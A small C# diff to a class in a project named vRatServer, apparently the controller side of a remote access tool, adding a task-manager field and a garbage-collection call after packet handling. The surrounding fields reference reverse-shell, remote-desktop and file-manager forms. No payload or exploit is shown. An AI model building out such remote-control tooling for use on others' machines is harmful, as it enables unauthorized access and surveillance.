@@ -22,7 +22,7 @@ namespace vRatServer.Classes
         public RemoteDesktop cf = null;
         public ReverseShellform rsf = null;
         public FileManagerForm fmf = null;
-
+        public TaskManager tkm = null;
         public List<string> screens;
         public int ScreenX;
         public int ScreenY;
@@ -139,7 +139,7 @@ namespace vRatServer.Classes
                         
 
                         new ClientPacket(id, com[0], ref data_buffer, len, this).packetHandler();
-                        
+                        GC.Collect();
 
 
                     }
